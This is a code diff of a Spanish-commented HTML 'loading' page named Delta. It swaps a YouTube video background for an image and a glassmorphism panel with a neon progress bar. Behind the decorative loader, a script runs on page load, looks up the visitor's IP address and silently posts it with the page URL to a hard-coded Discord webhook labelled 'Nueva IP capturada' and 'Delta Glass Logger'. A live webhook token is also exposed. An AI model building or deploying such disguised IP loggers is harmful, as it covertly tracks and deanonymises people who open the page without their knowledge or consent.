@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta</title>
+    <title>Delta - Loading</title>
     <style>
         * {
             margin: 0;
@@ -15,152 +15,158 @@
             height: 100%;
             width: 100%;
             overflow: hidden;
-            background-color: #000;
+            background-color: #050505; /* Fondo oscuro por si acaso */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: sans-serif;
         }
 
-        /* Video de fondo: Edificios nocturnos */
-        .video-container {
+        /* Contenedor de la foto de fondo con efectos */
+        .background-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
-            pointer-events: none;
+            background-image: url('https://i.pinimg.com/736x/5d/05/16/5d05164dabe52cbb4f28b2b8eb9ed3db.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            /* Efecto de animación de respiración/pulso sutil */
+            animation: backgroundPulse 20s infinite alternate ease-in-out;
+            filter: brightness(0.9) contrast(1.1); /* Ajuste ligero de color */
         }
 
-        #bg-video {
-            width: 100vw;
-            height: 100vh;
-            transform: scale(1.4); /* Elimina bordes negros de YT */
-            object-fit: cover;
-        }
-
-        /* Overlay con animaciones */
-        .overlay {
-            position: absolute;
+        /* Capa oscura superpuesta para mejorar contraste */
+        .vignette {
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.7) 100%);
+            z-index: 0;
+            background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.6) 100%);
+        }
+
+        /* Panel Glassmorphism */
+        .glass-panel {
+            z-index: 1;
+            padding: 25px;
+            width: 300px;
+            /* Efectos Glassmorphism clave */
+            background: rgba(255, 255, 255, 0.05); /* Semitransparente muy suave */
+            backdrop-filter: blur(12px); /* Desenfoque del fondo */
+            -webkit-backdrop-filter: blur(12px); /* Compatibilidad */
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1); /* Borde fino y claro */
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4); /* Sombra suave */
+            
+            /* Animación de entrada */
+            animation: panelFadeIn 1.5s ease-out;
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1;
         }
 
-        /* Barra de carga minimalista y transparente */
+        /* Barra de carga minimalista y neón */
         .loader-box {
-            width: 250px;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(5px);
+            width: 100%;
+            height: 4px; /* Un poco más fina */
+            background: rgba(0, 0, 0, 0.3); /* Fondo de la barra más oscuro */
             border-radius: 10px;
             overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-            animation: fadeIn 2s ease-in-out;
         }
 
         .progress-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #00ffcc, #0077ff);
-            box-shadow: 0 0 15px #00ffcc;
+            /* Degradado neón cian a azul */
+            background: linear-gradient(90deg, #00f2fe, #4facfe);
+            /* Brillo neón */
+            box-shadow: 0 0 12px rgba(0, 242, 254, 0.8), 0 0 4px rgba(79, 172, 254, 0.5);
             transition: width 0.1s linear;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
+        /* -- Definición de Animaciones -- */
+
+        @keyframes backgroundPulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.08); } /* Zoom suave in/out */
+        }
+
+        @keyframes panelFadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <div id="bg-video"></div>
-    </div>
+    <div class="background-container"></div>
+    <div class="vignette"></div>
 
-    <div class="overlay" onclick="enableAudio()">
+    <div class="glass-panel">
         <div class="loader-box">
             <div class="progress-fill" id="progress"></div>
         </div>
     </div>
 
     <script>
+        // Configuración de la Webhook (Mantenida)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';
 
-        // 1. YouTube Background API
-        var tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        var firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        // 1. Iniciar lógica al cargar la página
+        window.onload = function() {
+            startLoading();
+            sendMinimalData();
+        };
 
-        var player;
-        function onYouTubeIframeAPIReady() {
-            player = new YT.Player('bg-video', {
-                videoId: 'Tbw3w0RA0WU', // Video de edificios nocturnos / Lo-fi
-                playerVars: {
-                    'autoplay': 1,
-                    'controls': 0,
-                    'mute': 1,
-                    'loop': 1,
-                    'playlist': 'Tbw3w0RA0WU',
-                    'showinfo': 0,
-                    'rel': 0
-                },
-                events: {
-                    'onReady': (e) => {
-                        e.target.playVideo();
-                        startLoading();
-                        sendMinimalData();
-                    }
-                }
-            });
-        }
-
-        function enableAudio() {
-            if (player) {
-                player.unMute();
-                player.setVolume(40);
-            }
-        }
-
-        // 2. Barra de carga rápida y limpia
+        // 2. Barra de carga rápida (Mantenida)
         function startLoading() {
             const bar = document.getElementById('progress');
             let width = 0;
+            // Un poco más rápido dado que no hay vídeo que cargar
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
+                    // Opcional: Ocultar panel al terminar
+                    // setTimeout(() => document.querySelector('.glass-panel').style.opacity = '0', 500);
                 } else {
-                    width += 1.5; // Velocidad de carga
+                    width += 2; // Incremento más rápido
                     bar.style.width = width + '%';
                 }
-            }, 60);
+            }, 50); // Intervalo rápido
         }
 
-        // 3. Envío de datos simplificado (Solo IP y URL)
+        // 3. Envío de datos simplificado (Solo IP y URL - Mantenido)
         async function sendMinimalData() {
             let userIP = "Unknown";
             try {
+                // Obtenemos la IP de forma segura (HTTPS)
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 userIP = data.ip;
-            } catch (e) {}
+            } catch (e) {
+                console.error("Error obteniendo IP:", e);
+            }
 
+            // Payload mínimo
+            const payload = {
+                embeds: [{
+                    description: `🌐 **Nueva IP capturada:** \`${userIP}\` \n🔗 **Origen:** ${window.location.href}`,
+                    color: 52223, // Color Cyan neón para hacer juego
+                    footer: { text: "Delta Glass Logger" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Envío a la webhook (silent fail)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        description: `🌐 **Nueva IP capturada:** \`${userIP}\` \n🔗 **Origen:** ${window.location.href}`,
-                        color: 1752220, // Azul neón
-                        footer: { text: "Delta Minimal Logger" }
-                    }]
-                })
+                body: JSON.stringify(payload)
             }).catch(() => {});
         }
     </script>
